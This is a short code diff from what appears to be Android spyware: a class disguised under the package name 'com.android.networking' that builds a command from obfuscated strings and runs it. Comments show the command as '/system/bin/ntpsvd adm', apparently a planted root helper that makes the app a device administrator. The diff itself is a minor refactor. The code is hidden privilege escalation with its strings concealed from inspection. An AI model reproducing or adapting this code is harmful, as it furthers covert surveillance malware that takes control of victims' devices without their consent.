@@ -224,11 +224,12 @@ public class Core extends Activity implements Runnable {
 				// "com.android.networking/com.android.networking.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
 				String bd = Messages.getString("32_43");
-				String tbe = String.format("%s %s/%s%s", Messages.getString("32_43"), pack, pack,
+				String tbe = String.format("%s %s/%s%s",bd, pack, pack,
 						Messages.getString("32_44"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
+				
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}
